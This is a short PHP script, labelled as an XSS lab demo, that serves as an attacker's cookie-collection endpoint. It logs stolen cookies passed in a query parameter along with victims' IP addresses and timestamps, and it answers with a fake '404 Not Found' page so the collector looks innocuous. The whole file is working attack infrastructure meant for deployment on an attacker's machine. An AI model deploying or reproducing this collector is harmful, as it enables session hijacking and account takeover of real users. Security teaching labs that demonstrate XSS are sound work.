<?php
// ATTACKER'S COOKIE STEALER - XSS Lab Demo
// Deploy on attacker machine in the same project folder

$log_file = __DIR__ . "/stolen_cookies.txt";

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip     = $_SERVER['REMOTE_ADDR'];
    $time   = date('Y-m-d H:i:s');
    $entry  = "[$time] IP: $ip | Cookie: $cookie\n";
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
}
?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body>
</html>
